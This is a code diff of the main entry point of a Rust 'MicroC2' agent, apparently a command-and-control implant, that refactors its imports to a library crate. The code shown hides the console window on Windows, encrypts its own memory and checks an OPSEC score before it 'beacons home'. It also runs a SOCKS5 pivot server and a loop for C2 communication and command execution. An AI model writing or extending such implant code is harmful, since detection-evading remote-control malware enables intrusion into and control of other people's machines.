@@ -1,19 +1,22 @@
 #![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]
 
-mod commands;
-mod config;
-mod dormant;
-mod networking;
-mod opsec;
-mod util;
-mod state;
+// Use modules from the library crate 'agent'
+use agent::commands;
+use agent::config;
+use agent::dormant;
+use agent::networking;
+use agent::opsec;
+use agent::state;
+// use agent::util; // util is not directly used in main.rs from what I see
 
-use crate::commands::command_shell::agent_loop;
-use crate::config::AgentConfig;
-use crate::networking::socks5_pivot::Socks5PivotHandler;
-use crate::networking::socks5_pivot_server::Socks5PivotServer;
-use crate::opsec::{AgentMode, determine_agent_mode};
-use crate::state::MEMORY_PROTECTOR;
+// Specific imports from the library
+use agent::commands::command_shell::agent_loop;
+use agent::config::AgentConfig;
+use agent::networking::socks5_pivot::Socks5PivotHandler;
+use agent::networking::socks5_pivot_server::Socks5PivotServer;
+use agent::opsec::{AgentMode, determine_agent_mode};
+use agent::state::MEMORY_PROTECTOR;
+
 use log::{info, warn, error};
 use std::env;
 use std::sync::Arc;
@@ -49,18 +52,18 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     env_logger::init(); // Removed for size reduction
     info!("[STARTUP] MicroC2 Agent starting...");
 
-    let config = AgentConfig::load()?;
+    let config = agent::config::AgentConfig::load()?;
     info!("[CONFIG] Loaded agent config: {:?}", config);
 
     // Channel for pivot frames
     let (pivot_tx, mut pivot_rx) = tokio::sync::mpsc::channel(100);
-    let pivot_handler = Arc::new(tokio::sync::Mutex::new(Socks5PivotHandler::new(pivot_tx.clone())));
+    let pivot_handler = Arc::new(tokio::sync::Mutex::new(agent::networking::socks5_pivot::Socks5PivotHandler::new(pivot_tx.clone())));
 
     if config.socks5_enabled {
         info!("[CONFIG] SOCKS5 is enabled. Proxy: {}:{}, all C2 traffic will use SOCKS5 Proxy tunnel.", config.socks5_host, config.socks5_port);
 
         // Start SOCKS5 pivot server for operator-side pivoting
-        let pivot_server = Socks5PivotServer::new(
+        let pivot_server = agent::networking::socks5_pivot_server::Socks5PivotServer::new(
             config.socks5_host.clone(),
             config.socks5_port,
             pivot_tx.clone(),
@@ -91,7 +94,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // Start in FullOpsec mode: encrypted
     {
-        let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+        let mut protector = agent::state::MEMORY_PROTECTOR.lock().unwrap();
         protector.protect();
     }
 
@@ -99,31 +102,31 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // --- Initial Opsec Check Loop (before first agent_loop call) ---
     loop {
-        let current_mode = determine_agent_mode(&config);
+        let current_mode = agent::opsec::determine_agent_mode(&config);
         match current_mode {
-            AgentMode::BackgroundOpsec => {
+            agent::opsec::AgentMode::BackgroundOpsec => {
             info!("[OPSEC] Safe to beacon home. Starting agent.");
                 break; // Exit this loop to start agent_loop
             }
-            AgentMode::ReducedActivity => {
+            agent::opsec::AgentMode::ReducedActivity => {
                 info!("[OPSEC] Moderately high score. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
                 // Unencrypt for heartbeat
-                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+                { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
 
-                if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                     error!("[OPSEC] Heartbeat failed in ReducedActivity (initial loop): {}. C2 failure counter updated internally.", e);
         } else {
                     info!("[OPSEC] Heartbeat successful in ReducedActivity (initial loop).");
                 }
                 
                 // Ensure state is encrypted before sleep
-                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+                { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                 std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
             }
-            AgentMode::FullOpsec => {
+            agent::opsec::AgentMode::FullOpsec => {
                 info!("[OPSEC] Not safe to beacon home. Staying in FullOpsec (encrypted and dormant).");
                 // Ensure state is encrypted (might be redundant but safe)
-                { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+                { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                 std::thread::sleep(Duration::from_secs(5)); // Short sleep, rely on score decay/cooldown
         }
     }
@@ -133,43 +136,43 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // --- Main Agent Execution Loop --- 
     loop {
         // Decrypt memory before potential agent_loop call
-        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+        { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
         
         // agent_loop handles C2 comms and command execution
-        if let Err(e) = agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
+        if let Err(e) = agent::commands::command_shell::agent_loop(&server_addr, &agent_id, pivot_handler.clone(), pivot_tx.clone()).await {
             error!("[ERROR] Agent loop error: {}. Preparing to re-assess OPSEC state.", e);
             // Don't immediately exit; re-encrypt and re-assess below
         }
         
         // After agent_loop returns (or if it errored), always re-encrypt
-        { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+        { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
         info!("[OPSEC] Returned from agent_loop or error occurred. Re-encrypted. Re-assessing OPSEC state...");
 
         // Re-assessment Loop (similar to initial check)
         loop {
-            let current_mode = determine_agent_mode(&config);
+            let current_mode = agent::opsec::determine_agent_mode(&config);
             match current_mode {
-                 AgentMode::BackgroundOpsec => {
+                 agent::opsec::AgentMode::BackgroundOpsec => {
                     info!("[OPSEC] Safe to beacon home again. Resuming agent_loop.");
                     break; // Exit re-assessment loop, main loop will call agent_loop again
                 }
-                AgentMode::ReducedActivity => {
+                agent::opsec::AgentMode::ReducedActivity => {
                     info!("[OPSEC] High score after agent activity. Entering ReducedActivity mode. Attempting heartbeat then sleeping longer.");
                     // Memory should be protected at this stage of the loop.
                     // Unencrypt for heartbeat.
-                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
+                    { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.unprotect(); }
 
-                    if let Err(e) = crate::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
+                    if let Err(e) = agent::commands::command_shell::send_heartbeat_with_client(&config, &server_addr, &agent_id).await {
                         error!("[OPSEC] Heartbeat failed in ReducedActivity (re-assessment loop): {}. C2 failure counter updated internally.", e);
             } else {
                         info!("[OPSEC] Heartbeat successful in ReducedActivity (re-assessment loop).");
                     }
 
                     // Re-encrypt before sleep
-                    { let mut p = MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
+                    { let mut p = agent::state::MEMORY_PROTECTOR.lock().unwrap(); p.protect(); }
                     std::thread::sleep(Duration::from_secs(config.reduced_activity_sleep_secs)); 
                 }
-                AgentMode::FullOpsec => {
+                agent::opsec::AgentMode::FullOpsec => {
                      info!("[OPSEC] High score after agent activity. Entering FullOpsec mode.");
                 std::thread::sleep(Duration::from_secs(5));
                 }
